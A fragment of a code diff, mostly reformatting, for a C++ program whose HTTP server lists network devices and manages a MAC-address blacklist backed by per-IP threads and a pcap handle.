       std::lock_guard<std::mutex> lock(mtx);
       json response = json::array();
       for (const auto& d : devices) {
@@ -635,9 +793,9 @@ int main(void)
         }
       }
       add_cors_headers(res);
-      res.set_content(response.dump(), "application/json");
-    });
-    svr.Post("/blacklist", [](const Request& req, Response& res) {
+      res.set_content(response.dump(), "application/json"); });
+  svr.Post("/blacklist", [](const Request &req, Response &res)
+           {
       try {
         auto j = json::parse(req.body);
         std::string mac = j["mac"];
@@ -657,18 +815,18 @@ int main(void)
         if (is_delete) {
           blacklist.erase(mac);
           // 终止对应线程
-          {
-            std::lock_guard<std::mutex> thread_lock(blacklist_threads_mutex);
-            if (blacklist_threads.find(ip) != blacklist_threads.end()) {
-              if (blacklist_threads[ip].joinable()) {
-                blacklist_threads[ip].join();
-              }
-              blacklist_threads.erase(ip);
+          
+          std::lock_guard<std::mutex> thread_lock(blacklist_threads_mutex);
+          if (blacklist_threads.find(ip) != blacklist_threads.end()) {
+            if (blacklist_threads[ip].joinable()) {
+              blacklist_threads[ip].join();
             }
+            blacklist_threads.erase(ip);
           }
         } 
         else {
           blacklist.insert(mac);
+          
         }
         
         add_cors_headers(res);
@@ -677,21 +835,20 @@ int main(void)
       catch (...) {
         res.status = 400;
         res.set_content("Invalid request", "text/plain");
-      }
-    });
-    std::cout << "Server started at http://127.0.0.1:8080\n";
-    svr.listen("0.0.0.0", 8080);
+      } });
+  std::cout << "Server started at http://127.0.0.1:8080\n";
+  svr.listen("0.0.0.0", 8080);
 
-    // 清理
-    running = false;
+  // 清理
+  running = false;
+  std::lock_guard<std::mutex> lock(blacklist_threads_mutex);
+  for (auto &[ip, thread] : blacklist_threads)
+  {
+    if (thread.joinable())
     {
-        std::lock_guard<std::mutex> lock(blacklist_threads_mutex);
-        for (auto& [ip, thread] : blacklist_threads) {
-            if (thread.joinable()) {
-                thread.join();
-            }
-        }
+      thread.join();
     }
-    pcap_close(pcap_handle);
-    return 0;
+  }
+  pcap_close(pcap_handle);
+  return 0;
 }
